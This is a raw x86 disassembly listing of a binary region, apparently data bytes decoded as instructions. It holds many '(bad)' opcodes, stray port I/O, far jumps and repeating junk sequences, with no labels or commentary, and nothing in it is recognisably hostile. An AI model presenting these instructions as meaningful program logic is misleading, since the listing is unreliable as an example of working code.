  40857d:	push   edx
  40857e:	push   ds
  40857f:	inc    ebx
  408580:	nop
  408581:	shr    ah,1
  408583:	add    BYTE PTR [eax-0x6fbce1de],dl
  408589:	cmp    ebp,esi
  40858b:	add    BYTE PTR [eax-0x6fbce20e],dl
  408591:	cmp    ch,dh
  408593:	add    BYTE PTR [eax-0x6fbce23e],dl
  408599:	sbb    eax,0xd29000ee
  40859e:	sbb    eax,0xee1c9043
  4085a3:	add    BYTE PTR [eax-0x6fbce25e],dl
  4085a9:	aaa    
  4085aa:	out    dx,al
  4085ab:	add    BYTE PTR [eax-0x6fbce20e],dl
  4085b1:	ss out dx,al
  4085b3:	add    BYTE PTR [eax-0x6fbce23e],dl
  4085b9:	sbb    esi,ebp
  4085bb:	add    BYTE PTR [eax-0x6fbce22e],dl
  4085c1:	sbb    dh,ch
  4085c3:	add    BYTE PTR [eax-0x6fbce25e],dl
  4085c9:	mov    dl,0x4d
  4085cb:	loop   0x4085cd
  4085cd:	add    BYTE PTR [eax],al
  4085cf:	add    BYTE PTR [eax],al
  4085d1:	nop
  4085d2:	mov    dl,0xce
  4085d4:	adc    BYTE PTR [ebx-0x4e],dl
  4085d7:	ds loop 0x40856a
  4085da:	mov    dl,0xbe
  4085dc:	adc    BYTE PTR [ebx-0x4e],dl
  4085df:	sub    esp,edx
  4085e1:	nop
  4085e2:	mov    dl,0xae
  4085e4:	adc    bl,dl
  4085e6:	mov    dl,0x1c
  4085e8:	loop   0x40857a
  4085ea:	mov    dl,0x9e
  4085ec:	adc    bl,dl
  4085ee:	mov    dl,0x49
  4085f0:	loop   0x408582
  4085f2:	mov    dl,0xce
  4085f4:	adc    bl,dl
  4085f6:	mov    dl,0x3a
  4085f8:	loop   0x40858a
  4085fa:	mov    dl,0xbe
  4085fc:	adc    bl,dl
  4085fe:	mov    dl,0x27
  408600:	loop   0x408592
  408602:	mov    dl,0xae
  408604:	adc    bl,dl
  408606:	mov    dl,0x18
  408608:	loop   0x40859a
  40860a:	mov    dl,0x9e
  40860c:	adc    bl,dl
  40860e:	mov    dl,0xc5
  408610:	loope  0x4085a2
  408612:	mov    dl,0x4e
  408614:	adc    bl,dl
  408616:	mov    dl,0xc6
  408618:	loope  0x4085aa
  40861a:	mov    dl,0x3e
  40861c:	adc    bl,dl
  40861e:	mov    dl,0xc3
  408620:	loope  0x4085b2
  408622:	mov    dl,0x2e
  408624:	adc    BYTE PTR [ebx-0x4e],dl
  408627:	(bad)
  40862b:	push   ds
  40862c:	adc    BYTE PTR [ebx-0x4e],dl
  40862f:	and    ecx,0x104eb290
  408635:	add    BYTE PTR [eax],al
  408637:	add    BYTE PTR [eax],al
  408639:	add    BYTE PTR [ebx-0x4e],dl
  40863c:	and    cl,0x90
  40863f:	mov    dl,0x3e
  408641:	adc    BYTE PTR [ebx-0x4e],dl
  408644:	jg     0x408627
  408646:	nop
  408647:	mov    dl,0x2e
  408649:	adc    BYTE PTR [ebx-0x4e],dl
  40864c:	push   cs
  40864d:	mov    ?,WORD PTR [ecx-0x5feff14f]
  408653:	cmc    
  408654:	push   cs
  408655:	push   ecx
  408656:	scas   al,BYTE PTR es:[edi]
  408657:	mov    cl,0xe
  408659:	rol    BYTE PTR [edi-0x51bff10b],0xb1
  408660:	push   cs
  408661:	mov    al,0x87
  408663:	cmc    
  408664:	push   cs
  408665:	push   ebx
  408666:	scas   al,BYTE PTR es:[edi]
  408667:	mov    cl,0xe
  408669:	mov    al,ds:0x420ef3a7
  40866e:	outs   dx,BYTE PTR ds:[esi]
  40866f:	mov    bl,0xe
  408671:	nop
  408672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408673:	repz push cs
  408675:	adc    eax,0xc00eb36e
  40867a:	xchg   ebx,esi
  40867c:	push   cs
  40867d:	add    al,0x6e
  40867f:	mov    bl,0xe
  408681:	mov    al,0x87
  408683:	repz push cs
  408685:	pop    ss
  408686:	outs   dx,BYTE PTR ds:[esi]
  408687:	mov    bl,0xe
  408689:	mov    al,ds:0x60ef3a7
  40868e:	cs mov bl,0xe
  408691:	nop
  408692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408693:	repz push cs
  408695:	fnstcw WORD PTR [esi]
  408697:	mov    bl,0xd
  408699:	inc    eax
  40869a:	xchg   ebx,esi
  40869c:	push   cs
  40869d:	fadd   DWORD PTR [eax]
  40869f:	add    BYTE PTR [eax],al
  4086a1:	add    BYTE PTR [eax],al
  4086a3:	push   ds
  4086a4:	mov    bl,0xd
  4086a6:	xor    BYTE PTR [edi+0x1ebb0ef3],al
  4086ac:	mov    bl,0xd
  4086ae:	and    BYTE PTR [edi-0x145f10d],ah
  4086b4:	mov    dl,0xd
  4086b6:	adc    BYTE PTR [edi-0x1262f10d],ah
  4086bc:	mov    dl,0xe
  4086be:	inc    eax
  4086bf:	xchg   ebx,esi
  4086c1:	push   cs
  4086c2:	pushf  
  4086c3:	in     eax,dx
  4086c4:	mov    dl,0xe
  4086c6:	xor    BYTE PTR [edi+0x57000ef3],al
  4086cc:	lea    ecx,[edi]
  4086ce:	add    BYTE PTR [eax-0x61],dh
  4086d1:	dec    ebx
  4086d2:	add    BYTE PTR [esi-0x73],al
  4086d5:	lock jmp DWORD PTR [eax+0x31004b9f]
  4086dc:	popf   
  4086dd:	push   cs
  4086de:	add    BYTE PTR [ecx+0x40004ba1],ch
  4086e4:	popf   
  4086e5:	push   cs
  4086e6:	add    BYTE PTR [ecx+0x53004ba1],bl
  4086ec:	popf   
  4086ed:	push   cs
  4086ee:	add    BYTE PTR [ecx-0x5f],ch
  4086f1:	dec    ebx
  4086f2:	add    dl,al
  4086f4:	popf   
  4086f5:	push   cs
  4086f6:	add    BYTE PTR [ecx-0x5f],bl
  4086f9:	dec    ebx
  4086fa:	add    BYTE PTR [ebp+0x69000e9d],ch
  408700:	mov    eax,ds:0x9d7c004b
  408705:	push   cs
  408706:	add    BYTE PTR [eax],al
  408708:	add    BYTE PTR [eax],al
  40870a:	add    BYTE PTR [eax],al
  40870c:	pop    ecx
  40870d:	mov    eax,ds:0x908f004b
  408712:	(bad)  
  408714:	lock lahf 
  408716:	dec    ebx
  408717:	add    BYTE PTR [esi],bh
  408719:	lea    ecx,[edi]
  40871b:	add    BYTE PTR [eax],ah
  40871d:	mov    al,ds:0x82a9004b
  408722:	add    BYTE PTR [eax],al
  408724:	shl    BYTE PTR [eax-0x7d47ffb5],1
  40872a:	add    BYTE PTR [eax],al
  40872c:	pusha  
  40872d:	mov    al,ds:0x82ab004b
  408732:	add    BYTE PTR [eax],al
  408734:	mov    al,0xa0
  408736:	dec    ebx
  408737:	add    BYTE PTR [edx-0x7e],bh
  40873a:	add    BYTE PTR [eax],al
  40873c:	mov    al,ds:0x65004ba0
  408741:	add    BYTE PTR [eax],0x0
  408744:	push   eax
  408745:	mov    al,ds:0x690004b
  40874a:	dec    DWORD PTR [edi]
  40874c:	nop
  40874d:	ret    0x4318
  408750:	nop
  408751:	pop    es
  408752:	dec    DWORD PTR [edi]
  408754:	nop
  408755:	rcr    BYTE PTR [eax],cl
  408757:	inc    ebx
  408758:	nop
  408759:	or     bh,bh
  40875b:	seto   BYTE PTR [edx+0x1904318]
  408762:	loopne 0x408773
  408764:	nop
  408765:	jb     0x408781
  408767:	inc    ebx
  408768:	nop
  408769:	adc    ah,al
  40876b:	seto   BYTE PTR [edx+0x1a]
  40876f:	inc    ebx
  408770:	add    BYTE PTR [eax],al
  408772:	add    BYTE PTR [eax],al
  408774:	add    BYTE PTR [eax-0x6ff01ffd],dl
  40877a:	push   edx
  40877b:	sbb    al,BYTE PTR [ebx-0x70]
  40877e:	adc    al,ah
  408780:	seto   BYTE PTR [edx]
  408783:	sbb    al,BYTE PTR [ebx-0x70]
  408786:	(bad)  
  408787:	fisttp WORD PTR [edi]
  408789:	nop
  40878a:	jb     0x4087a6
  40878c:	inc    ebx
  40878d:	nop
  40878e:	push   cs
  40878f:	loopne 0x4087a0
  408791:	nop
  408792:	inc    edx
  408793:	sbb    al,BYTE PTR [ebx-0x70]
  408796:	std    
  408797:	fisttp WORD PTR [edi]
  408799:	nop
  40879a:	push   edx
  40879b:	sbb    al,BYTE PTR [ebx-0x70]
  40879e:	or     al,0xe0
  4087a0:	seto   BYTE PTR [edx]
  4087a3:	sbb    al,BYTE PTR [ebx-0x70]
  4087a6:	sti    
  4087a7:	call   0x1a3317ac
  4087ac:	inc    ebx
  4087ad:	nop
  4087ae:	cli    
  4087af:	call   0x1a0317b4
  4087b4:	inc    ebx
  4087b5:	nop
  4087b6:	fld1   
  4087b8:	add    BYTE PTR [eax-0x6fbce62e],dl
  4087be:	fsubr  st,st(0)
  4087c0:	add    BYTE PTR [eax-0x6fbce65e],dl
  4087c6:	mov    dl,0x71
  4087c8:	out    0x90,al
  4087ca:	mov    dl,0x4e
  4087cc:	adc    eax,0xe672b253
  4087d1:	nop
  4087d2:	mov    dl,0x3e
  4087d4:	adc    eax,0xe64fb253
  4087d9:	add    BYTE PTR [eax],al
  4087db:	add    BYTE PTR [eax],al
  4087dd:	add    BYTE PTR [eax+0x53152eb2],dl
  4087e3:	mov    dl,0x50
  4087e5:	out    0x90,al
  4087e7:	mov    dl,0x1e
  4087e9:	adc    eax,0xe58db253
  4087ee:	nop
  4087ef:	mov    dl,0xce
  4087f1:	adc    al,0x53
  4087f3:	mov    dl,0x7e
  4087f5:	in     eax,0x90
  4087f7:	mov    dl,0xbe
  4087f9:	adc    al,0x53
  4087fb:	mov    dl,0x6b
  4087fd:	in     eax,0x90
  4087ff:	mov    dl,0xae
  408801:	adc    al,0xd3
  408803:	mov    dl,0x5c
  408805:	in     eax,0x90
  408807:	mov    dl,0x9e
  408809:	adc    al,0xd3
  40880b:	mov    dl,0x89
  40880d:	in     eax,0x90
  40880f:	mov    dl,0xce
  408811:	adc    al,0xd3
  408813:	mov    dl,0x7a
  408815:	in     eax,0x90
  408817:	mov    dl,0xbe
  408819:	adc    al,0xd3
  40881b:	mov    dl,0x67
  40881d:	in     eax,0x90
  40881f:	mov    dl,0xae
  408821:	adc    al,0xd3
  408823:	mov    dl,0x58
  408825:	in     eax,0x90
  408827:	mov    dl,0x9e
  408829:	adc    al,0xd3
  40882b:	mov    dl,0x85
  40882d:	in     eax,0x2f
  40882f:	jne    0x408880
  408831:	adc    al,0xd3
  408833:	mov    dl,0x86
  408835:	in     eax,0x1f
  408837:	jne    0x408878
  408839:	adc    al,0xd3
  40883b:	mov    dl,0x83
  40883d:	in     eax,0xf
  40883f:	jne    0x408870
  408841:	adc    al,0x0
  408843:	add    BYTE PTR [eax],al
  408845:	add    BYTE PTR [eax],al
  408847:	push   ebx
  408848:	mov    dl,0xe
  40884a:	mov    dh,ch
  40884c:	mov    cl,0xe
  40884e:	adc    BYTE PTR [ecx+esi*8-0x4e1bb2f2],bl
  408855:	or     eax,0xef17c40
  40885a:	dec    esp
  40885b:	cmc    
  40885c:	mov    cl,0xe
  40885e:	xor    BYTE PTR [ecx+esi*8+0xe],bh
  408862:	dec    edi
  408863:	mov    ds:0xa1d90eb2,al
  408868:	icebp  
  408869:	push   cs
  40886a:	dec    esi
  40886b:	mov    ds:0xa1d90eb2,al
  408870:	icebp  
  408871:	push   cs
  408872:	xchg   ecx,eax
  408873:	mov    dl,0x74
  408875:	lock rol BYTE PTR [ebx-0x4d7ff10f],0x74
  40887d:	lock mov al,0x83
  408880:	icebp  
  408881:	push   cs
  408882:	xchg   ebx,eax
  408883:	jb     0x4088f9
  408885:	lock mov al,ds:0x820eefa3
  40888b:	jb     0x408840
  40888d:	push   cs
  40888e:	nop
  40888f:	mov    ds:0x63550eef,eax
  408894:	mov    bl,0xd
  408896:	rol    BYTE PTR [ebx+0x72440eef],0xb3
  40889d:	push   cs
  40889e:	mov    al,0x83
  4088a0:	out    dx,eax
  4088a1:	push   cs
  4088a2:	push   edi
  4088a3:	xor    dh,BYTE PTR [ebx-0x105c5ff2]
  4088a9:	push   cs
  4088aa:	inc    esi
  4088ab:	add    BYTE PTR [eax],al
  4088ad:	add    BYTE PTR [eax],al
  4088af:	add    BYTE PTR [edx],dh
  4088b1:	mov    bl,0xe
  4088b3:	nop
  4088b4:	mov    ds:0x32990eef,eax
  4088b9:	mov    bl,0xe
  4088bb:	inc    eax
  4088bc:	sub    edi,0xe
  4088bf:	cwde   
  4088c0:	xor    dh,BYTE PTR [ebx-0x107ccff2]
  4088c6:	push   cs
  4088c7:	add    BYTE PTR [ebx-0x4ffff070],cl
  4088cd:	lahf   
  4088ce:	dec    ebx
  4088cf:	add    BYTE PTR [edx-0x70],bh
  4088d2:	verr   WORD PTR [eax+0x4d004b9f]
  4088d9:	nop
  4088da:	lldt   WORD PTR [eax-0x61]
  4088de:	dec    ebx
  4088df:	add    BYTE PTR [eax+edx*4],bh
  4088e2:	verr   WORD PTR [eax-0x70ffb461]
  4088e9:	nop
  4088ea:	(bad)  
  4088ec:	jo     0x40888d
  4088ee:	dec    ebx
  4088ef:	add    BYTE PTR [esi-0x70],bh
  4088f2:	verr   WORD PTR [eax-0xeffb461]
  4088f9:	sahf   
  4088fa:	push   cs
  4088fb:	add    BYTE PTR [ecx+0x4ba5],ch
  408901:	lahf   
  408902:	push   cs
  408903:	add    BYTE PTR [ecx+0x13004ba5],bl
  408909:	or     BYTE PTR [edi],0x1
  40890c:	xor    BYTE PTR [eax-0x6dfdffb5],ah
  408912:	sldt   WORD PTR [eax]
  408915:	add    BYTE PTR [eax],al
  408917:	add    BYTE PTR [eax],al
  408919:	and    BYTE PTR [eax-0x6e0affb5],ah
  40891f:	lldt   WORD PTR [eax-0x60]
  408923:	dec    ebx
  408924:	add    ah,al
  408926:	xchg   ecx,eax
  408927:	verr   WORD PTR [eax]
  40892a:	mov    al,ds:0x91d7004b
  40892f:	(bad)  
  408931:	lock lahf 
  408933:	dec    ebx
  408934:	add    BYTE PTR [esi+0x20000f91],al
  40893a:	mov    al,ds:0x9179004b
  40893f:	lldt   ax
  408942:	mov    al,ds:0xca90004b
  408947:	in     eax,dx
  408948:	add    BYTE PTR [eax-0x6fbce33e],dl
  40894e:	(bad)  
  40894f:	in     eax,dx
  408950:	add    BYTE PTR [eax-0x6fbce32e],dl
  408956:	enter  0xed,0x90
  40895a:	mov    ds:0xc590431c,al
  40895f:	cld    
  408960:	add    BYTE PTR [ecx-0x6fbce30e],dl
  408966:	(bad)  
  408967:	cld    
  408968:	add    BYTE PTR [ecx-0x6fbce33e],dl
  40896e:	ret    
  40896f:	cld    
  408970:	add    BYTE PTR [ecx-0x6fbce32e],dl
  408976:	(bad)  
  408977:	in     eax,dx
  408978:	add    BYTE PTR [eax+0x431ca2],dl
  40897e:	add    BYTE PTR [eax],al
  408980:	add    BYTE PTR [eax],al
  408982:	nop
  408983:	inc    ecx
  408984:	in     eax,dx
  408985:	jmp    DWORD PTR [edi-0x6fbce18f]
  40898b:	push   edx
  40898c:	in     eax,dx
  40898d:	call   DWORD PTR [edi-0x6fbce1bf]
  408993:	and    eax,0x1387ffed
  408998:	push   ds
  408999:	inc    ebx
  40899a:	nop
  40899b:	adc    al,0xed
  40899d:	push   DWORD PTR [edi+0x43]
  4089a0:	push   ds
  4089a1:	inc    ebx
  4089a2:	nop
  4089a3:	daa    
  4089a4:	in     eax,dx
  4089a5:	jmp    DWORD PTR [edi+0x73]
  4089a8:	push   ds
  4089a9:	inc    ebx
  4089aa:	nop
  4089ab:	push   ss
  4089ac:	in     eax,dx
  4089ad:	call   DWORD PTR [edi+0x23]
  4089b0:	push   ds
  4089b1:	inc    ebx
  4089b2:	nop
  4089b3:	sub    ebp,ebp
  4089b5:	inc    DWORD PTR [edi+0x13]
  4089b8:	push   ds
  4089b9:	inc    ebx
  4089ba:	nop
  4089bb:	sbb    ch,ch
  4089bd:	push   DWORD PTR [edi]
  4089bf:	inc    ebx
  4089c0:	push   ds
  4089c1:	inc    ebx
  4089c2:	nop
  4089c3:	mov    dl,0x35
  4089c5:	adc    edx,DWORD PTR [eax-0x2cf20a4e]
  4089cb:	mov    dl,0x36
  4089cd:	loop   0x40895f
  4089cf:	mov    dl,0x3e
  4089d1:	adc    DWORD PTR [ebx-0x4e],edx
  4089d4:	adc    esp,edx
  4089d6:	nop
  4089d7:	mov    dl,0x2e
  4089d9:	adc    DWORD PTR [ebx-0x4e],edx
  4089dc:	adc    al,0xe2
  4089de:	nop
  4089df:	mov    dl,0x1e
  4089e1:	adc    DWORD PTR [ebx-0x4e],edx
  4089e4:	xor    edx,esp
  4089e6:	add    BYTE PTR [eax],al
  4089e8:	add    BYTE PTR [eax],al
  4089ea:	add    BYTE PTR [eax+0x53114eb2],dl
  4089f0:	mov    dl,0x32
  4089f2:	loop   0x408984
  4089f4:	mov    dl,0x3e
  4089f6:	adc    DWORD PTR [ebx-0x4e],edx
  4089f9:	psrad  mm2,QWORD PTR [eax+0x53112eb2]
  408a00:	mov    dl,0x10
  408a02:	loop   0x408994
  408a04:	mov    dl,0x1e
  408a06:	adc    DWORD PTR [ebx-0x4e],edx
  408a09:	int    0xe1
  408a0b:	nop
  408a0c:	mov    dl,0xce
  408a0e:	adc    BYTE PTR [ebx-0x4e],dl
  408a11:	mov    esi,0xbeb290e1
  408a16:	adc    bl,dl
  408a18:	mov    dl,0xab
  408a1a:	loope  0x4089ac
  408a1c:	mov    dl,0xae
  408a1e:	adc    bl,dl
  408a20:	mov    dl,0x9c
  408a22:	loope  0x4089b4
  408a24:	mov    dl,0x9e
  408a26:	adc    bl,dl
  408a28:	mov    dl,0xc9
  408a2a:	loope  0x4089bc
  408a2c:	mov    dl,0xce
  408a2e:	adc    bl,dl
  408a30:	mov    dl,0xba
  408a32:	loope  0x4089c4
  408a34:	mov    dl,0xbe
  408a36:	adc    bl,dl
  408a38:	mov    dl,0xa7
  408a3a:	loope  0x4089cc
  408a3c:	mov    dl,0xae
  408a3e:	adc    bl,dl
  408a40:	mov    dl,0xe
  408a42:	xchg   esi,eax
  408a43:	xor    DWORD PTR [edx-0xa7f6ff2],esi
  408a49:	push   cs
  408a4a:	dec    ecx
  408a4b:	xor    DWORD PTR [edx+0x400e],esi
  408a51:	add    BYTE PTR [eax],al
  408a53:	add    BYTE PTR [eax+0x31480ef5],al
  408a59:	mov    dl,0xe
  408a5b:	xor    BYTE PTR [eax-0xeb4f10b],ah
  408a61:	mov    cl,0xe
  408a63:	and    BYTE PTR [eax-0xeb5f10b],ah
  408a69:	mov    cl,0xe
  408a6b:	adc    BYTE PTR [eax-0xef2f10b],al
  408a71:	mov    cl,0xe
  408a73:	inc    eax
  408a74:	xor    ch,0xe
  408a77:	or     al,0xf1
  408a79:	mov    cl,0xe
  408a7b:	xor    BYTE PTR [eax-0x4ef0f10b],ah
  408a81:	mov    cl,0xe
  408a83:	and    BYTE PTR [eax-0x4ef1f10b],ah
  408a89:	mov    cl,0xe
  408a8b:	adc    BYTE PTR [eax-0x512ef10b],al
  408a91:	mov    cl,0xe
  408a93:	shl    BYTE PTR [edi-0x513ff10d],0xb1
  408a9a:	push   cs
  408a9b:	mov    al,0x87
  408a9d:	cmc    
  408a9e:	push   cs
  408a9f:	shr    DWORD PTR [esi-0x4d],cl
  408aa2:	push   cs
  408aa3:	mov    al,ds:0xc20ef587
  408aa8:	outs   dx,BYTE PTR ds:[esi]
  408aa9:	mov    bl,0xe
  408aab:	nop
  408aac:	addr16 cmc 
  408aae:	push   cs
  408aaf:	xchg   ebp,eax
  408ab0:	outs   dx,BYTE PTR ds:[esi]
  408ab1:	mov    bl,0xe
  408ab3:	shl    BYTE PTR [edi-0xb],0xe
  408ab7:	test   BYTE PTR [eax],al
  408ab9:	add    BYTE PTR [eax],al
  408abb:	add    BYTE PTR [eax],al
  408abd:	outs   dx,BYTE PTR ds:[esi]
  408abe:	mov    bl,0xe
  408ac0:	mov    al,0x47
  408ac2:	cmc    
  408ac3:	push   cs
  408ac4:	add    BYTE PTR [edi],bl
  408ac6:	pop    ecx
  408ac7:	(bad)  
  408ac9:	lock addr16 dec ebp
  408acc:	add    BYTE PTR [esi],cl
  408ace:	pop    ecx
  408acf:	sldt   WORD PTR [eax]
  408ad2:	push   0x65c9004d
  408ad7:	lock call FWORD PTR [ecx]
  408ada:	push   0x4d
  408adc:	add    BYTE PTR [eax-0x3ffff0a8],bh
  408ae2:	addr16 dec ebp
  408ae4:	add    bl,cl
  408ae6:	pop    eax
  408ae7:	(bad)  
  408ae9:	mov    al,0x67
  408aeb:	dec    ebp
  408aec:	add    BYTE PTR [edx-0x7ffff0a8],bh
  408af2:	addr16 dec ebp
  408af4:	add    BYTE PTR [ebp+0x50000f58],al
  408afa:	addr16 dec ebp
  408afc:	add    BYTE PTR [eax+ebx*2+0xf],dh
  408b00:	add    BYTE PTR [eax-0x38ffb299],al
  408b06:	push   ebp
  408b07:	(bad)  
  408b09:	jo     0x408b72
  408b0b:	dec    ebp
  408b0c:	add    BYTE PTR [esi-0x7ffff0ab],dh
  408b12:	addr16 dec ebp
  408b14:	add    BYTE PTR [ecx-0x2ffff0ab],dh
  408b1a:	push   0x55c0004d
  408b1f:	sldt   WORD PTR [eax]
  408b22:	add    BYTE PTR [eax],al
  408b24:	add    BYTE PTR [eax],al
  408b26:	inc    eax
  408b27:	push   0x5553004d
  408b2c:	(bad)  
  408b2e:	xor    BYTE PTR [eax+0x4d],ch
  408b31:	add    BYTE PTR [edx+0x55],al
  408b34:	sldt   WORD PTR [eax]
  408b37:	push   0x552d004d
  408b3c:	lldt   WORD PTR [eax+0x68]
  408b40:	dec    ebp
  408b41:	add    BYTE PTR [eax-0x6fff15ba],dl
  408b47:	and    bh,cl
  408b49:	inc    edx
  408b4a:	nop
  408b4b:	aaa    
  408b4c:	jmp    0x9042:0xf9129000
  408b53:	call   0x89708b52
  408b58:	test   BYTE PTR [edx-0x70],0x59
  408b5c:	or     al,0x0
  408b5e:	nop
  408b5f:	pop    ecx
  408b60:	or     al,0x0
  408b62:	nop
  408b63:	pop    ecx
  408b64:	or     al,0x0
  408b66:	nop
  408b67:	push   0xffffffe8
  408b69:	inc    DWORD PTR [edi]
  408b6b:	pop    ecx
  408b6c:	or     al,0x0
  408b6e:	nop
  408b6f:	mov    ch,al
  408b71:	push   edi
  408b73:	pop    eax
  408b74:	or     al,0x0
  408b76:	nop
  408b77:	mov    ch,al
  408b79:	jmp    edi
  408b7b:	pop    eax
  408b7c:	or     al,0x0
  408b7e:	nop
  408b7f:	push   0xffffffe8
  408b81:	call   edi
  408b83:	pop    eax
  408b84:	or     al,0x0
  408b86:	nop
  408b87:	push   0xffffffe8
  408b89:	inc    DWORD PTR [eax]
  408b8b:	add    BYTE PTR [eax],al
  408b8d:	add    BYTE PTR [eax],al
  408b8f:	(bad)  
  408b90:	pop    eax
  408b91:	or     al,0x0
  408b93:	nop
  408b94:	mov    ch,al
  408b96:	push   DWORD PTR [edi-0x6ffff3a8]
  408b9c:	mov    ch,al
  408b9e:	jmp    DWORD PTR [edi-0x6ffff3a8]
  408ba4:	push   0xffffffe8
  408ba6:	call   DWORD PTR [edi-0x6efef2a7]
  408bac:	pop    ecx
  408bad:	or     eax,0xd5a9101
  408bb2:	add    DWORD PTR [ecx-0x6efef2a7],edx
  408bb8:	pop    edx
  408bb9:	or     eax,0xd599101
  408bbe:	add    DWORD PTR [ecx-0x6efd194e],edx
  408bc4:	mov    bl,0xe3
  408bc6:	add    dl,BYTE PTR [ecx-0x6efd194d]
  408bcc:	mov    bl,0xe3
  408bce:	add    dl,BYTE PTR [ecx-0x6efd194d]
  408bd4:	mov    bl,0xe3
  408bd6:	add    dl,BYTE PTR [ecx-0x6efd194d]
  408bdc:	mov    bl,0xe3
  408bde:	add    dl,BYTE PTR [ecx-0x6efd194d]
  408be4:	mov    bl,0xe3
  408be6:	add    dl,BYTE PTR [ecx-0x6bf81e4d]
  408bec:	mov    dh,0xea
  408bee:	pop    es
  408bef:	mov    WORD PTR [esi+0x7e1],?
  408bf5:	add    BYTE PTR [eax],al
  408bf7:	add    BYTE PTR [esi+esi*4-0x4973f816],dl
  408bfe:	loope  0x408c07
  408c00:	xchg   esp,eax
  408c01:	mov    dh,0xea
  408c03:	pop    es
  408c04:	mov    WORD PTR [esi-0x496bf81f],?
  408c0a:	jmp    0x9407:0xe1b68c07
  408c11:	mov    dh,0xea
  408c13:	pop    es
  408c14:	mov    WORD PTR [esi-0x496bf81f],?
  408c1a:	jmp    0x9407:0xe1b68c07
  408c21:	mov    dh,0xea
  408c23:	pop    es
  408c24:	mov    WORD PTR [esi-0x496bf81f],?
  408c2a:	jmp    0x9003:0xe5b68c07
  408c31:	mov    dl,0xe5
  408c33:	add    edx,DWORD PTR [eax-0x6ffc1a4e]
  408c39:	mov    dl,0xe5
  408c3b:	add    edx,DWORD PTR [eax-0x6c16f14e]
  408c41:	mov    dl,0xe
  408c43:	jmp    0xe94f3edb
  408c48:	xchg   ebx,eax
  408c49:	mov    dl,0xe
  408c4b:	jmp    0xe94f3ee3
  408c50:	xchg   ebx,eax
  408c51:	mov    dl,0xe
  408c53:	jmp    0xe94f3eeb
  408c58:	xchg   ebx,eax
  408c59:	mov    dl,0xe
  408c5b:	jmp    0x408c60
  408c60:	add    BYTE PTR [ebx-0x6c16f14e],dl
  408c66:	mov    dl,0xe
  408c68:	jmp    0xe94f3f00
  408c6d:	xchg   ebx,eax
  408c6e:	mov    dl,0xe
  408c70:	jmp    0xe94f3f08
  408c75:	cmc    
  408c76:	mov    cl,0xe
  408c78:	xor    ah,bh
  408c7a:	out    dx,eax
  408c7b:	push   cs
  408c7c:	call   0x204f3e76
  408c81:	cld    
  408c82:	out    dx,eax
  408c83:	push   cs
  408c84:	jmp    0x408c7b
  408c86:	mov    cl,0xe
  408c88:	adc    ah,bl
  408c8a:	out    dx,eax
  408c8b:	push   cs
  408c8c:	jmp    0xefdc:0x400eb1f5
  408c93:	push   cs
  408c94:	in     eax,dx
  408c95:	mov    ch,0x6c
  408c97:	lock xor BYTE PTR [edi+ebp*8+0x6ce6ec0e],bh
  408c9f:	lock and BYTE PTR [edi+ebp*8+0x6ca2ef0e],bh
  408ca7:	lock adc BYTE PTR [edi+ebp*8+0x6ca4ee0e],bl
  408caf:	lock shl BYTE PTR [ebx+0x71e10eef],0xb3
  408cb7:	push   cs
  408cb8:	mov    al,0x83
  408cba:	icebp  
  408cbb:	push   cs
  408cbc:	add    BYTE PTR [eax+0x30000f52],al
  408cc2:	pusha  
  408cc3:	dec    ebp
  408cc4:	add    BYTE PTR [eax],al
  408cc6:	add    BYTE PTR [eax],al
  408cc8:	add    BYTE PTR [eax],al
  408cca:	jae    0x408d1e
  408ccc:	sldt   WORD PTR [eax]
  408ccf:	pusha  
  408cd0:	dec    ebp
  408cd1:	add    BYTE PTR [edx+0x52],ah
  408cd4:	lldt   WORD PTR [eax+0x60]
  408cd8:	dec    ebp
  408cd9:	add    BYTE PTR ds:0xfff052,dh
  408cdf:	pusha  
  408ce0:	dec    ebp
  408ce1:	add    BYTE PTR [ebx+ecx*4-0x10],al
  408ce5:	push   eax
  408ce7:	pop    edi
  408ce8:	dec    ebp
  408ce9:	add    BYTE PTR [edi],dh
  408ceb:	lock inc DWORD PTR [bx+si]
  408cef:	pusha  
  408cf0:	dec    ebp
  408cf1:	add    BYTE PTR [esi],ah
  408cf3:	lock call DWORD PTR [bx+di+0x4d64]
  408cf9:	add    BYTE PTR [ecx],cl
  408cfb:	push   edx
  408cfc:	sldt   eax
  408cff:	pop    edi
  408d00:	dec    ebp
  408d01:	add    al,bl
  408d03:	push   ecx
  408d04:	(bad)  
  408d06:	mov    al,0x5f
  408d08:	dec    ebp
  408d09:	add    bl,cl
  408d0b:	push   ecx
  408d0c:	sldt   WORD PTR [eax-0x25ffb2a1]
  408d13:	push   ecx
  408d14:	lldt   WORD PTR [eax+0x5f]
  408d18:	dec    ebp
  408d19:	add    ch,cl
  408d1b:	push   ecx
  408d1c:	lock inc DWORD PTR [eax-0x23ffb2a1]
  408d23:	mov    dh,al
  408d25:	push   DWORD PTR [eax+0x5f]
  408d28:	dec    ebp
  408d29:	add    bh,cl
  408d2b:	lock inc WORD PTR [eax]
  408d2f:	add    BYTE PTR [eax],al
  408d31:	add    BYTE PTR [eax],al
  408d33:	sbb    BYTE PTR [edi+0x4d],0x0
  408d37:	sahf   
  408d38:	lock call ax
  408d3c:	pusha  
  408d3d:	dec    ebp
  408d3e:	add    BYTE PTR [eax-0x6fff119f],dl
  408d44:	and    bh,ch
  408d46:	inc    edx
  408d47:	nop
  408d48:	push   edx
  408d49:	out    dx,al
  408d4a:	add    BYTE PTR [eax-0x6fbd02ee],dl
  408d50:	jg     0x408d40
  408d52:	add    BYTE PTR [eax-0x6fbd02be],dl
  408d58:	mov    al,0xec
  408d5a:	add    BYTE PTR [eax-0x6fbd028e],dl
  408d60:	gs out dx,al
  408d62:	inc    DWORD PTR [edi+0x22]
  408d65:	std    
  408d66:	inc    edx
  408d67:	nop
  408d68:	push   esi
  408d69:	xlat   BYTE PTR ds:[ebx]
  408d6a:	push   DWORD PTR [edi]
  408d6c:	adc    bh,ch
  408d6e:	inc    edx
  408d6f:	nop
  408d70:	cmp    ebx,0xffffffff
  408d73:	daa    
  408d74:	inc    edx
  408d75:	std    
  408d76:	inc    edx
  408d77:	nop
  408d78:	mov    ah,0xf9
  408d7a:	call   DWORD PTR [edi]
  408d7c:	repnz cld 
  408d7e:	inc    edx
  408d7f:	nop
  408d80:	mov    ecx,0xa29000ec
  408d85:	cld    
  408d86:	inc    edx
  408d87:	nop
  408d88:	mov    edx,0x929000ec
  408d8d:	cld    
  408d8e:	inc    edx
  408d8f:	nop
  408d90:	mov    bh,0xec
